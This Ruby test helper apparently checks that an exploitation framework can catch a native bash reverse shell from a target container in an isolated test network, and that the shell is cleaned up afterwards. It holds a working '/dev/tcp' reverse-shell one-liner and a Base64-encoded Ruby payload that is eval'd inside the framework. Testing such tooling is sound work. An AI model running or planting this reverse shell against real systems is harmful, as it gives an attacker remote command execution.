# frozen_string_literal: true

# The callback endpoint runs in Framework's isolated network, outside the host.
module CraftAssetSessionPrerequisites
  def ca_native_shell
    token = 'craftasset-native-shell-' + Process.pid.to_s
    source = <<~RUBY
      begin
        server=TCPServer.new('0.0.0.0',0)
        state={server:server,port:server.local_address.ip_port}
        state[:thread]=Thread.new do
          peer=nil
          begin
            Timeout.timeout(12) do
              peer=server.accept
              peer.write("printf '%s\\n' #{token};id -u;echo $$;printf '%s\\n' #{token}-done;exit\\n")
              state[:response]=String.new
              loop { state[:response] << peer.readpartial(4096) }
            end
          rescue EOFError
            state[:eof]=true
          rescue StandardError => error
            state[:error]={type:error.class.name,message:error.message}
          ensure
            peer.close if peer;server.close
          end
        end
        framework.instance_variable_set(:@craft_asset_native_shell,state)
        {port:state[:port]}
      end
    RUBY
    setup = rc_json("eval(Base64.strict_decode64(#{Base64.strict_encode64(source).inspect}))")
    port = setup.fetch('port')
    command = "exec 3<>/dev/tcp/#{listener_host}/#{port};sh <&3 >&3 2>&3"
    bounded = 'import subprocess,sys;result=subprocess.run(["bash","-c",sys.argv[1]],timeout=15);sys.exit(result.returncode)'
    output, status = rc_command('native-bash-receiver', 'app', 'python3', '-c', bounded, command, required: false)
    expect(status).to eq(0), output
    response = rc_json('begin;state=framework.instance_variable_get(:@craft_asset_native_shell);state[:thread].join(2);{response:state[:response],error:state[:error],eof:state[:eof],alive:state[:thread].alive?};end')
    @rc[:native_shell] = response.merge('port' => port)
    expect(response).to include('error' => nil, 'eof' => true, 'alive' => false)
    lines = response.fetch('response').lines.map(&:strip)
    expect(lines).to include(token, it_expected_uid.to_s, token + '-done')
    pid = lines.reverse.find { |line| line.match?(/\A\d{2,}\z/) }.to_i
    expect(pid).to be > 1
    expect(cc_process(pid)).to include('exists' => false)
    expect(cc_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) }).to be(true)
  ensure
    if setup
      rc_json('begin;state=framework.instance_variable_get(:@craft_asset_native_shell);state[:server].close unless state[:server].closed?;state[:thread].kill if state[:thread].alive?;state[:thread].join;true;end')
    end
    rc_save
  end
end
